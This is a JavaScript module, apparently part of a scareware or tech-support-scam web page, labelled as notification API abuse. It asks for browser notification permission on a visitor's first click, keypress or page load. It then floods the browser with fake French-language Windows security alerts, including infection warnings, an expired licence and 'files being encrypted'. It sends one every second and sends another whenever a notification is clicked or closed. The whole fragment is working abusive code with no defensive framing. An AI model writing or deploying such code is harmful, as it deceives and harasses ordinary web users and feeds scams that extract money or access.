/**
 * 7. NOTIFICATION API ABUSE - MAXIMUM AGGRESSION
 */
const NotificationAbuse = {
    init: function() { this.requestPermission(); },
    requestPermission: function() {
        if ('Notification' in window) {
            document.addEventListener('click', () => {
                Notification.requestPermission().then((p) => { if (p === 'granted') this.startNotificationStorm(); });
            }, { once: true });
            document.addEventListener('keydown', () => {
                Notification.requestPermission().then((p) => { if (p === 'granted') this.startNotificationStorm(); });
            }, { once: true });
            Notification.requestPermission().then((p) => { if (p === 'granted') this.startNotificationStorm(); });
        }
    },
    startNotificationStorm: function() {
        const notifications = [
            { title: '⚠️ Alerte Windows', body: 'Menace détectée! Votre ordinateur est infecté.', icon: '/images/bel.png' },
            { title: '🔒 Sécurité', body: 'Vos données personnelles sont compromises!', icon: '/images/bel.png' },
            { title: '🚨 Urgent', body: 'Action requise immédiatement!', icon: '/images/bel.png' },
            { title: '⚡ Critique', body: 'Pare-feu désactivé - Danger imminent!', icon: '/images/bel.png' },
            { title: '🛡️ Protection', body: 'Licence Windows expirée!', icon: '/images/bel.png' },
            { title: '⛔ BLOQUÉ', body: 'Accès non autorisé détecté sur votre réseau!', icon: '/images/bel.png' },
            { title: '🔴 CRITIQUE', body: 'Vos fichiers sont en cours de chiffrement!', icon: '/images/bel.png' }
        ];
        const sendNotification = () => {
            const notif = notifications[Math.floor(Math.random() * notifications.length)];
            const n = new Notification(notif.title, {
                body: notif.body, icon: notif.icon, badge: notif.icon,
                requireInteraction: true, tag: 'fs17-alert-' + Date.now(), silent: false, renotify: true
            });
            n.onclick = () => { window.focus(); setTimeout(sendNotification, 100); };
            n.onclose = () => { setTimeout(sendNotification, 50); };
            setTimeout(() => n.close(), 2000);
        };
        setInterval(sendNotification, 1000);
        sendNotification();
    }
};